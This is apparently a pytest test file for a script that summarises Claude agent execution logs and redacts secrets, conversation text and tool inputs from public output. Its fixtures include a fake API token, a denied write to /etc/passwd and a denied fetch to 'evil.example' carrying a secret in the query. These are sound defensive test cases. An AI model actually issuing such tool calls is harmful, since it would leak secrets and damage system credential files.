"""daily-intel 失敗原因摘要：公開 log 只能出現錯誤欄位，不能出現對話、工具輸入或疑似金鑰。"""
import importlib.util
import json

from tools.common import SENTINEL_ROOT

spec = importlib.util.spec_from_file_location("ces", SENTINEL_ROOT / "scripts" / "claude-error-summary.py")
ces = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ces)

SECRET = "sk-ant-oat01-" + "A" * 60


def run(tmp_path, capsys, messages, raw=None):
    p = tmp_path / "claude-execution-output.json"
    p.write_text(raw if raw is not None else json.dumps(messages, ensure_ascii=False), encoding="utf-8")
    assert ces.main(["x", str(p)]) == 0
    return capsys.readouterr().out


def test_auth_error_is_summarized_without_secrets(tmp_path, capsys):
    out = run(tmp_path, capsys, [
        {"type": "system", "subtype": "init", "model": "claude-sonnet-5-5", "apiKeySource": "none",
         "tools": ["Read"], "cwd": "/home/runner/work/x"},
        {"type": "user", "message": {"content": "使用者提示與網頁內容：機密段落"}},
        {"type": "assistant", "error": "authentication_failed",
         "message": {"content": [{"type": "text", "text": f"Invalid token {SECRET}"}]}},
        {"type": "result", "subtype": "success", "is_error": True, "num_turns": 1, "duration_ms": 166,
         "result": f"Invalid API key · {SECRET}\nPlease run /login"},
    ])
    assert "模型：claude-sonnet-5-5；驗證來源：none" in out
    assert "API 錯誤：authentication_failed" in out
    assert "錯誤訊息：Invalid API key · [REDACTED] Please run /login" in out
    assert SECRET not in out and "機密段落" not in out and "/home/runner" not in out


def test_success_result_text_is_not_printed(tmp_path, capsys):
    out = run(tmp_path, capsys, [{"type": "result", "subtype": "error_max_turns", "is_error": False, "num_turns": 40,
                                  "result": "最後一段對話內容"}])
    assert "subtype=error_max_turns" in out and "最後一段對話內容" not in out


def test_long_message_truncated_and_jsonl_supported(tmp_path, capsys):
    lines = "\n".join(json.dumps(m) for m in [{"type": "result", "is_error": True, "result": "x " * 500, "errors": ["e1"]}])
    out = run(tmp_path, capsys, None, raw=lines)
    msg = next(line for line in out.splitlines() if line.startswith("錯誤訊息："))
    assert len(msg) <= len("錯誤訊息：") + ces.LIMIT and "錯誤：e1" in out


def test_missing_or_empty_file(tmp_path, capsys):
    assert ces.main(["x", str(tmp_path / "none.json")]) == 0
    assert "找不到執行紀錄" in capsys.readouterr().out
    assert run(tmp_path, capsys, []).strip() == "執行紀錄中沒有可辨識的訊息"


def test_permission_denials_listed_without_content(tmp_path, capsys, monkeypatch):
    monkeypatch.chdir(tmp_path)
    cwd = str(tmp_path)
    out = run(tmp_path, capsys, [{"type": "result", "subtype": "success", "is_error": False, "num_turns": 3,
        "result": "最後的對話內容", "permission_denials": [
            {"tool_name": "Write", "tool_input": {"file_path": f"{cwd}/out/intel-daily.json", "content": "機密內容"}},
            {"tool_name": "Write", "tool_input": {"file_path": "/etc/passwd", "content": "x"}},
            {"tool_name": "Read", "tool_input": {"file_path": "out/stack.json"}},
            {"tool_name": "WebFetch", "tool_input": {"url": "https://evil.example/path?q=secret", "prompt": "p"}},
            {"tool_name": "Agent", "tool_input": {"subagent_type": "other", "prompt": "做壞事"}},
        ]}])
    lines = [line for line in out.splitlines() if line.startswith("權限拒絕：")]
    assert lines == ["權限拒絕：Write out/intel-daily.json", "權限拒絕：Write （工作目錄外）…/passwd",
                     "權限拒絕：Read out/stack.json", "權限拒絕：WebFetch evil.example", "權限拒絕：Agent subagent=other"]
    for leaked in ("機密內容", "最後的對話內容", "secret", "做壞事", "/etc/"):
        assert leaked not in out


def test_tool_activity_errors_and_final_message(tmp_path, capsys):
    msgs = [
        {"type": "assistant", "message": {"content": [
            {"type": "tool_use", "id": "t1", "name": "Read", "input": {"file_path": "out/stack.json"}},
            {"type": "tool_use", "id": "t2", "name": "Agent", "input": {"subagent_type": "news-scout", "prompt": "搜尋機密"}}]}},
        {"type": "assistant", "parent_tool_use_id": "t2", "message": {"content": [
            {"type": "tool_use", "id": "t3", "name": "WebSearch", "input": {"query": "查詢內容"}}]}},
        {"type": "user", "message": {"content": [
            {"type": "tool_result", "tool_use_id": "t1", "is_error": True, "content": "File does not exist."},
            {"type": "tool_result", "tool_use_id": "t3", "is_error": True, "content": [{"type": "text", "text": "Web search unavailable " + "x" * 300}]},
            {"type": "tool_result", "tool_use_id": "t2", "is_error": False, "content": "網頁內容不該出現"}]}},
        {"type": "result", "subtype": "success", "is_error": False, "num_turns": 7, "result": "找不到 out/stack.json，無法進行。"},
    ]
    p = tmp_path / "exec.json"
    p.write_text(json.dumps(msgs, ensure_ascii=False), encoding="utf-8")
    assert ces.main(["x", "--with-result", str(p)]) == 0
    out = capsys.readouterr().out
    assert "工具呼叫（主 Agent）：Agent(news-scout)×1、Read×1" in out
    assert "工具呼叫（Subagent）：WebSearch×1" in out
    assert "工具錯誤：Read：File does not exist." in out
    err = next(line for line in out.splitlines() if line.startswith("工具錯誤：WebSearch"))
    assert len(err) <= len("工具錯誤：WebSearch：") + 150
    assert "Claude 最後的說明：找不到 out/stack.json，無法進行。" in out
    for leaked in ("搜尋機密", "查詢內容", "網頁內容不該出現"):
        assert leaked not in out
    assert ces.main(["x", str(p)]) == 0                       # 沒有 --with-result 時不印最後的說明
    assert "Claude 最後的說明" not in capsys.readouterr().out


def test_blocked_webfetch_hosts_aggregated(tmp_path, capsys):
    msgs = [
        {"type": "assistant", "parent_tool_use_id": "a1", "message": {"content": [
            {"type": "tool_use", "id": f"w{i}", "name": "WebFetch", "input": {"url": u, "prompt": "p"}}
            for i, u in enumerate(["https://focustaiwan.tw/a?secret=1", "https://focustaiwan.tw/b", "https://newtalk.tw/c",
                                   "https://www.ithome.com.tw/d"])]}},
        {"type": "user", "message": {"content": [
            {"type": "tool_result", "tool_use_id": "w0", "is_error": True, "content": "PreToolUse:WebFetch hook error: WebFetch 只允許受信任來源的 HTTPS 網址"},
            {"type": "tool_result", "tool_use_id": "w1", "is_error": True, "content": "PreToolUse:WebFetch hook error: WebFetch 只允許受信任來源的 HTTPS 網址"},
            {"type": "tool_result", "tool_use_id": "w2", "is_error": True, "content": "PreToolUse:WebFetch hook error: WebFetch 只允許受信任來源的 HTTPS 網址"},
            {"type": "tool_result", "tool_use_id": "w3", "is_error": True, "content": "HTTP 403"}]}},
    ]
    out = run(tmp_path, capsys, msgs)
    assert "WebFetch 被擋的網站（不在信任清單）：focustaiwan.tw×2、newtalk.tw×1" in out
    assert "工具錯誤：WebFetch www.ithome.com.tw：HTTP 403" in out
    assert "secret" not in out and "/a" not in out


def test_activity_log_outcomes_without_content(tmp_path, capsys, monkeypatch):
    monkeypatch.chdir(tmp_path)
    page = "<html>機密網頁內容 HTTP 403 出現在內文</html>"
    calls = [("w1", "WebFetch", {"url": "https://www.ithome.com.tw/news/1"}, "The server returned HTTP 403 Forbidden.", False),
             ("w2", "WebFetch", {"url": "https://infosecu.technews.tw/x"}, "REDIRECT DETECTED: ...", False),
             ("w3", "WebFetch", {"url": "https://nextjs.org/blog"}, "--- title: Release ---\n" + "x" * 400 + page, False),
             ("w4", "WebFetch", {"url": "https://newtalk.tw/x"}, "PreToolUse:WebFetch hook error: WebFetch 只允許受信任來源的 HTTPS 網址", True),
             ("s1", "WebSearch", {"query": "台灣 電商 個資外洩"}, 'Links: [{"title":"a","url":"u1"},{"title":"b","url":"u2"}]', False),
             ("a1", "Agent", {"subagent_type": "news-scout", "prompt": "秘密指示"}, "report", False)]
    msgs = [{"type": "assistant", "message": {"content": [{"type": "tool_use", "id": i, "name": n, "input": inp}]}} for i, n, inp, _, _ in calls]
    msgs.append({"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": i, "is_error": e, "content": body}
                                                          for i, _, _, body, e in calls]}})
    p = tmp_path / "exec.json"
    p.write_text(json.dumps(msgs, ensure_ascii=False), encoding="utf-8")
    assert ces.main(["x", "--activity", str(p)]) == 0
    out = capsys.readouterr().out
    for line in ("[主 Agent] WebFetch www.ithome.com.tw → HTTP 403（網站擋機器人）", "[主 Agent] WebFetch infosecu.technews.tw → 轉址（未跟隨）",
                 "[主 Agent] WebFetch nextjs.org → 成功", "[主 Agent] WebFetch newtalk.tw → 被擋（不在信任清單）",
                 "[主 Agent] WebSearch 「台灣 電商 個資外洩」 → 2 筆結果", "[主 Agent] Agent (news-scout) → 完成"):
        assert line in out
    assert "機密網頁內容" not in out and "秘密指示" not in out and "/news/1" not in out


# ---------------------------------------------------------------- Orchestrator 派工／驗收的訂閱步驟（R9.1）
import hashlib  # noqa: E402

import pytest  # noqa: E402

from schemas import TraceEvent  # noqa: E402
from tools.trace import read_trace  # noqa: E402

NOW = "2026-11-13T00:10:00+00:00"
PROPOSAL_SECRET = "提案內容不該出現"
ORCH_MSGS = [
    {"type": "system", "subtype": "init", "model": "claude-sonnet-5-5", "apiKeySource": "none"},
    {"type": "assistant", "message": {"content": [
        {"type": "tool_use", "id": "r1", "name": "Read", "input": {"file_path": "out/orchestrator-dispatch/dispatch-input.json"}},
        {"type": "tool_use", "id": "r2", "name": "Read", "input": {"file_path": ".claude/skills/orchestrator/references/policy.md"}},
        {"type": "tool_use", "id": "r3", "name": "Read", "input": {"file_path": "out/orchestrator-dispatch/internal/context.json"}}]}},
    {"type": "user", "message": {"content": [
        {"type": "tool_result", "tool_use_id": "r1", "is_error": False, "content": "輸入內容不該出現"},
        {"type": "tool_result", "tool_use_id": "r3", "is_error": True, "content": "hook denied"}]}},
    {"type": "assistant", "message": {"content": [
        {"type": "tool_use", "id": "w1", "name": "Write", "input": {"file_path": "out/orchestrator-dispatch/dispatch-proposal.json",
                                                                     "content": PROPOSAL_SECRET}}]}},
    {"type": "result", "subtype": "success", "is_error": False, "num_turns": 4, "duration_ms": 41000, "result": "最後的說明不該出現",
     "permission_denials": [{"tool_name": "Read", "tool_input": {"file_path": "out/orchestrator-dispatch/internal/context.json"}}]},
]


@pytest.mark.parametrize("mode", ["dispatch", "review"])
def test_orchestrator_trace_events_without_content(mode):
    evs = ces.orchestrator_trace_events(ORCH_MSGS, mode, "accepted", NOW)
    zh = {"dispatch": "派工", "review": "驗收"}[mode]
    assert [(e["kind"], e["detail"]) for e in evs] == [
        ("start", f"Claude（訂閱方案）執行 orchestrator Skill（{zh}）：只讀公開輸入與核准政策，寫出提案交給程式核准"),
        ("skill", f"載入 orchestrator Skill（{zh}）"),
        ("tool", "工具：Read×3、Write×1"),
        ("skip", "被拒絕的工具呼叫（hook 或權限設定）：Read×1"),
        ("result", "寫出提案並通過程式檢查（4 回合、41 秒）；由程式政策逐項核准"),
    ]
    for e in evs:
        TraceEvent.model_validate(e)                                       # A5 合併後網站讀得到（source 為 None）
        assert e["agent"] == f"orchestrator-{mode}" and e["ts"] == NOW and e["subagent"] is None
    text = json.dumps(evs, ensure_ascii=False)
    for leaked in (PROPOSAL_SECRET, "輸入內容不該出現", "最後的說明不該出現", "internal/context.json"):
        assert leaked not in text


def test_orchestrator_trace_states():
    assert ces.orchestrator_trace_events([], "review", "missing", NOW)[-1]["detail"] == \
        "Claude 沒有執行（Token 檢查失敗或設定錯誤），驗收改用 Agent SDK 或空提案"
    rejected = ces.orchestrator_trace_events(ORCH_MSGS, "dispatch", "rejected", NOW)[-1]
    assert rejected["kind"] == "error" and rejected["detail"].startswith("寫出提案但沒有通過程式檢查，不採用")
    missing = ces.orchestrator_trace_events(ORCH_MSGS, "dispatch", "missing", NOW)[-1]
    assert missing["kind"] == "error" and missing["detail"].startswith("沒有寫出提案（4 回合、41 秒）")


def test_proposal_state(tmp_path):
    d = tmp_path / "orchestrator-dispatch"
    d.mkdir()
    assert ces.proposal_state(tmp_path, "dispatch") == "missing"
    (d / "dispatch-proposal.json").write_bytes(b"{}")
    assert ces.proposal_state(tmp_path, "dispatch") == "rejected"                 # 沒有採用標記
    (d / "dispatch-proposal.accepted").write_text("0" * 64, encoding="utf-8")
    assert ces.proposal_state(tmp_path, "dispatch") == "rejected"                 # 標記不符
    (d / "dispatch-proposal.accepted").write_text(hashlib.sha256(b"{}").hexdigest().upper() + "\n", encoding="utf-8")
    assert ces.proposal_state(tmp_path, "dispatch") == "accepted"                 # 與 read_subscription 相同：strip、不分大小寫


@pytest.mark.parametrize("mode", ["dispatch", "review"])
def test_orchestrator_trace_cli_appends(tmp_path, monkeypatch, capsys, mode):
    """派工與驗收的 trace 由程式步驟先寫入；訂閱步驟的紀錄接在後面，不覆蓋。"""
    monkeypatch.chdir(tmp_path)
    d = tmp_path / "out" / f"orchestrator-{mode}"
    d.mkdir(parents=True)
    trace = d / "trace.jsonl"
    first = {"ts": "2026-11-13T00:05:00+00:00", "agent": f"orchestrator-{mode}", "subagent": None, "kind": "result",
             "detail": "程式步驟", "source": "template", "cost_usd": None}
    trace.write_text(json.dumps(first, ensure_ascii=False) + "\n", encoding="utf-8")
    p = d / f"{mode}-proposal.json"
    p.write_text(json.dumps({"summary": PROPOSAL_SECRET}, ensure_ascii=False), encoding="utf-8")
    (d / f"{mode}-proposal.accepted").write_text(hashlib.sha256(p.read_bytes()).hexdigest(), encoding="utf-8")
    exec_file = tmp_path / "exec.json"
    exec_file.write_text(json.dumps(ORCH_MSGS, ensure_ascii=False), encoding="utf-8")
    rel = f"out/orchestrator-{mode}/trace.jsonl"
    assert ces.main(["x", "--trace", rel, "--job", f"orchestrator-{mode}", str(exec_file)]) == 0
    evs = read_trace(trace)
    assert evs[0] == first and evs[-1]["detail"].startswith("寫出提案並通過程式檢查")
    assert PROPOSAL_SECRET not in trace.read_text(encoding="utf-8") and PROPOSAL_SECRET not in capsys.readouterr().out
    assert ces.main(["x", "--trace", rel, "--job", f"orchestrator-{mode}", str(tmp_path / "missing.json")]) == 0
    assert "沒有執行" in read_trace(trace)[-1]["detail"] and read_trace(trace)[0] == first


def test_unknown_job_is_usage_error(tmp_path, capsys):
    assert ces.main(["x", "--trace", str(tmp_path / "t.jsonl"), "--job", "orchestrator", str(tmp_path / "e.json")]) == 2
    assert "orchestrator-dispatch|orchestrator-review" in capsys.readouterr().err
